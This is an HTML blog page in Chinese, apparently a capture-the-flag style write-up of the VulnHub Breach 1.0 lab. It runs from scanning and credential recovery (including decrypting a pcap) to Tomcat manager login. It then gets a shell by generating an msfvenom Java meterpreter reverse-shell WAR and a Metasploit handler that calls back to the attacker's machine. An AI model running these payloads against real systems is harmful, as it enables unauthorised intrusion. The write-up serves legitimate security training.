@@ -1,0 +1,889 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.ico">
+  <link rel="icon" href="/img/avatar.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pacemrc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境信息靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;breach-1,152&#x2F; kali攻击机：192.168.110.128 Breach靶机：192.168.110.140 该靶机设置了静态IP，需要将虚拟网段改成192.168.110.0&#x2F;24 渗透测试信息收集主机存活识别在kali上使用namp进行主机发现 nmap -sP 192.168.110.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="breach-1152">
+<meta property="og:url" content="https://pacemrc.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/breach-1152/index.html">
+<meta property="og:site_name" content="白日梦想家">
+<meta property="og:description" content="环境信息靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;breach-1,152&#x2F; kali攻击机：192.168.110.128 Breach靶机：192.168.110.140 该靶机设置了静态IP，需要将虚拟网段改成192.168.110.0&#x2F;24 渗透测试信息收集主机存活识别在kali上使用namp进行主机发现 nmap -sP 192.168.110.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151104777.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151503293.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151644893.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151834736.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151944698.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515152205791.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515152240544.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153102726.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153152764.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153353867.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153433642.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153548306.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153606368.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153624725.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153636179.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153840440.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154041756.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154055412.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154121919.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154400041.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154535860.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515155420921.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160012130.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160210595.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160331648.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160430608.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160854968.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160915957.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515161027440.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515161156967.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515161422354.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095759748.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516094211063.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095258634.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095329968.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095407897.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095528547.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095911776.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516101349220.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516102448911.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516102518155.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516102704604.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103008017.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103129076.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103106688.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515165339025.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103238718.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103633697.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103747952.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103846859.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103952885.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515172538506.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515172846453.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515173035264.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515173223321.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515173444862.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515174411738.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515174505782.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515174815383.png">
+<meta property="article:published_time" content="2025-11-05T09:17:10.000Z">
+<meta property="article:modified_time" content="2025-11-26T11:02:09.746Z">
+<meta property="article:author" content="pacemrc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151104777.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>breach-1152 - 白日梦想家</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pacemrc.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白日梦想家</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/category.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="breach-1152"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        pacemrc
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-05 17:17" pubdate>
+          2025年11月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-10 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">breach-1152</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h1><p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/breach-1,152/">https://www.vulnhub.com/entry/breach-1,152/</a></p>
+<p>kali攻击机：192.168.110.128</p>
+<p>Breach靶机：192.168.110.140 该靶机设置了静态IP，需要将虚拟网段改成192.168.110.0&#x2F;24</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活识别"><a href="#主机存活识别" class="headerlink" title="主机存活识别"></a>主机存活识别</h3><p>在kali上使用namp进行主机发现</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.110.0</span>/<span class="hljs-number">24</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151104777.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现除该网段下除kali本机和网关IP外，存在192.168.110.140主机，即为靶机IP</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>对192.168.110.140主机进行端口和服务扫描</p>
+<div class="code-wrapper"><pre><code class="hljs dns">nmap -v -<span class="hljs-keyword">A</span> -T<span class="hljs-number">4 192.168.110</span>.<span class="hljs-number">140</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151503293.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.110.140/">http://192.168.110.140/</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151644893.png" srcset="/img/loading.gif" lazyload></p>
+<p>对靶机背景简单描述了下，查看一下网页源代码，发现存在一串加密字符串</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151834736.png" srcset="/img/loading.gif" lazyload></p>
+<p>猜测是base64加密，使用工具进行解密</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515151944698.png" srcset="/img/loading.gif" lazyload></p>
+<p>经过两次解密后得出以下信息，似乎是登陆用户名密码</p>
+<div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">pgibbons:</span>damnitfeel<span class="hljs-number">$goodtobeagang</span><span class="hljs-number">$ta</span>
+</code></pre></div>
+
+<p>同时发现点击页面中的图片会跳转超链接<a target="_blank" rel="noopener" href="http://192.168.110.140/initech.html">http://192.168.110.140/initech.html</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515152205791.png" srcset="/img/loading.gif" lazyload></p>
+<p>点击超链接跳转到<strong>Penetrode Cyber Consulting, LLP</strong>主页</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515152240544.png" srcset="/img/loading.gif" lazyload></p>
+<p>依次点击左侧大纲，前三个连接到图片，第四个连接到一个php页面</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153102726.png" srcset="/img/loading.gif" lazyload></p>
+<p>点击超链接，跳转到一个impresscms</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153152764.png" srcset="/img/loading.gif" lazyload></p>
+<p>页面中存在一个用户登陆的功能，使用上面解密出的用户名密码尝试登陆</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153353867.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现成功登陆</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153433642.png" srcset="/img/loading.gif" lazyload></p>
+<p>先看看该cms上面有什么线索</p>
+<p>发现收件箱里有3个邮件</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153548306.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153606368.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153624725.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153636179.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="发现keystore文件"><a href="#发现keystore文件" class="headerlink" title="发现keystore文件"></a>发现keystore文件</h3><p>在第三封邮件中发现在<a target="_blank" rel="noopener" href="http://192.168.110.140/.keystore%E4%BF%9D%E5%AD%98%E4%BA%86%E4%B8%80%E4%B8%AAkeystore%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%8D%B3%E4%B8%8B%E8%BD%BD">http://192.168.110.140/.keystore保存了一个keystore文件，访问即下载</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515153840440.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="发现攻击流量pcap文件"><a href="#发现攻击流量pcap文件" class="headerlink" title="发现攻击流量pcap文件"></a>发现攻击流量pcap文件</h3><p>继续发现其他线索，在该content区域发现一个邮件</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154041756.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154055412.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154121919.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过描述得知<a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%E6%98%AF%E6%94%BB%E5%87%BB%E6%97%B6%E7%9A%84%E6%8A%93%E5%8C%85%E6%96%87%E4%BB%B6%EF%BC%8C%E5%90%8C%E6%97%B6%E6%9C%89%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%AF%B4alias">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap是攻击时的抓包文件，同时有一句话说alias</a> name、storepassword 和keypassword 都设置为tomcat</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%E5%8D%B3%E4%B8%8B%E8%BD%BDpcap%E6%96%87%E4%BB%B6">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap即下载pcap文件</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154400041.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开pcap文件，发现流量是加密数据</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515154535860.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="解密pcap文件"><a href="#解密pcap文件" class="headerlink" title="解密pcap文件"></a>解密pcap文件</h3><p>推断需要使用keystore文件对pcap文件进行解密。经查询keystore文件是一种用于存储证书和私钥的文件格式，可以使用kali的keytool进行查看证书信息。</p>
+<div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">keytool</span> -v -list -keystore keystore
+<span class="hljs-comment">#口令是tomcat</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515155420921.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="从密钥库导出p12证书"><a href="#从密钥库导出p12证书" class="headerlink" title="从密钥库导出p12证书"></a>从密钥库导出p12证书</h3><div class="code-wrapper"><pre><code class="hljs bash">keytool -importkeystore -srckeystore ./keystore -destkeystore ./tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160012130.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="将p12证书导入wireshark"><a href="#将p12证书导入wireshark" class="headerlink" title="将p12证书导入wireshark"></a>将p12证书导入wireshark</h3><p>打开pcap文件，在编辑-首选项-Protocols-TLS中，点击Edit RSA key list</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160210595.png" srcset="/img/loading.gif" lazyload></p>
+<p>添加一项，再点击Ok</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160331648.png" srcset="/img/loading.gif" lazyload></p>
+<p>再次查看流量已经是解密流量了</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160430608.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="登陆tomcat后台"><a href="#登陆tomcat后台" class="headerlink" title="登陆tomcat后台"></a>登陆tomcat后台</h2><p>通过流量发现再对<a target="_blank" rel="noopener" href="https://192.168.110.140:8443/_M@nag3Me/html%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%EF%BC%8C%E9%80%9A%E8%BF%87%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%B9%E8%AF%A5%E5%9C%B0%E5%9D%80%E8%AE%BF%E9%97%AE%E5%8F%91%E7%8E%B0%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%EF%BC%8C%E6%8E%A8%E6%96%AD%E6%98%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%A4%E4%B8%BA%E4%B8%8D%E5%AE%89%E5%85%A8%EF%BC%8C%E9%9C%80%E8%A6%81%E8%AF%81%E4%B9%A6%EF%BC%8C%E6%AD%A4%E6%97%B6%E5%8F%AF%E5%88%A9%E7%94%A8burpsuite%E7%9A%84%E8%AF%81%E4%B9%A6%E5%81%9A%E4%BB%A3%E7%90%86">https://192.168.110.140:8443/_M@nag3Me/html进行访问，通过浏览器对该地址访问发现无法直接访问，推断是浏览器认为不安全，需要证书，此时可利用burpsuite的证书做代理</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160854968.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515160915957.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功访问后发现需要登陆认证，继续从pcap中寻找认证信息</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515161027440.png" srcset="/img/loading.gif" lazyload></p>
+<p>从第一个请求中可知未认证授权访问返回401，第二个请求访问返回200，推断第二个请求中携带了认证信息，查看第二个请求包</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515161156967.png" srcset="/img/loading.gif" lazyload></p>
+<p>可知使用了http basic基础认证，使用base64进行解密，获得以下信息</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tomcat</span>:Tt\\<span class="hljs-number">5</span>D8F(#!*u=G)<span class="hljs-number">4</span>m7zB
+</code></pre></div>
+
+<p>使用该登陆信息登陆<a target="_blank" rel="noopener" href="https://192.168.110.140:8443/_M@nag3Me/html">https://192.168.110.140:8443/_M@nag3Me/html</a></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515161422354.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功登陆后台，是tomcat应用</p>
+<h2 id="tomcat后台getshell"><a href="#tomcat后台getshell" class="headerlink" title="tomcat后台getshell"></a>tomcat后台getshell</h2><p>通过tomcat页面可进行部署应用，此时可以上传webshell来getshell</p>
+<p>kali开启反弹shell监听</p>
+<div class="code-wrapper"><pre><code class="hljs routeros">msfconsole
+use exploit/multi/handler
+<span class="hljs-built_in">set</span> payload java/meterpreter/reverse_tcp
+<span class="hljs-built_in">set</span> LHOST 192.168.110.128
+<span class="hljs-built_in">run</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095759748.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用kali生成反弹shell的war包</p>
+<div class="code-wrapper"><pre><code class="hljs routeros">msfvenom -p java/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.110.128 <span class="hljs-attribute">LPORT</span>=4444 -f war &gt; webshell.war
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516094211063.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传该war包至tomcat部署</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095258634.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095329968.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时发现在tomcat的应用目录下多了&#x2F;webshell目录</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095407897.png" srcset="/img/loading.gif" lazyload></p>
+<p>点击该目录以触发webshell</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095528547.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时查看kali接收到shell</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516095911776.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516101349220.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>为了使shell的执行有回显，开启伪终端</p>
+<div class="code-wrapper"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516102448911.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看passwd文件，重点关注用户id未1000以后且未&#x2F;bin&#x2F;bash可登陆用户</p>
